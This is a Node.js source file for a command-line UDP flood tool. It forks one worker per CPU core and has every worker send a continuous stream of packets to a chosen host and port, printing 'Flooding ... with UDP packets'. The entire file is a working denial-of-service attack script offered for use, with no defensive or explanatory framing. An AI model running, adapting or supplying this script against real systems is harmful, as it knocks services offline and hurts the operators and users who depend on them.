var dgram = require("dgram"),
    client = dgram.createSocket('udp4'),
    Commander  = require('commander'),
    cluster = require('cluster'),
    os = require('os'),
    q = require('q');
    
var commander = Commander
  .option('-h, --host <host>', 'Host Name/IP.', String)
  .option('-w, --workers <workers>', 'Number of workers to fork in the cluster, default is CPU count.', parseInt)
  .option('-p, --port <port>', 'If not defined, program will use random ports.', parseInt)
  .option('-d, --delay <delay>', 'Delay in ms between packet sending (per worker). Defaults to 0.', parseInt)
  .option('-s, --silent', 'Silences printing the sent packet count on each cluster.')
  .parse(process.argv);


require('./q-flow');

var port = commander.port || Math.floor(Math.random() * (65553) + 1);
var workers = commander.workers || os.cpus().length + 1;

function sendOne(ip, port){
  return new Promise(function(resolve, reject){
    var msg = new Buffer('X');
    client.send(msg, 0, msg.length, port, ip, function(err){
      return err ? reject(err) : resolve();
    });
  });
}

function runWorker(){
  var packetsSent = 0;
  console.log('Flooding', commander.host, 'with UDP packets on port', port);
  // Small timeout to read the msg above before packet counts print to console.
  setTimeout(function(){
    q.until(function() {
      return q.delay(commander.delay || 0)
      .then(function(){
        return sendOne(commander.host, port);
      })
      .then(function() {
        packetsSent++;
        if(!commander.silent) console.log('packets sent', packetsSent);
        return false;
      });
    }).done(function() {
      return console.log('done');
    });
  }, 3000);
}
if(!commander.host) return console.log('No host specified. Exiting.');

if(cluster.isMaster){
  for (var i = 0; i < workers; i++) {
    console.log('Started worker', i + 1);
    cluster.fork();
  }
  
  cluster.on('exit', function(worker, code, signal) {
    console.log('Worker ' + worker.process.pid + ' died');
  });
  
}else{
  runWorker();
}
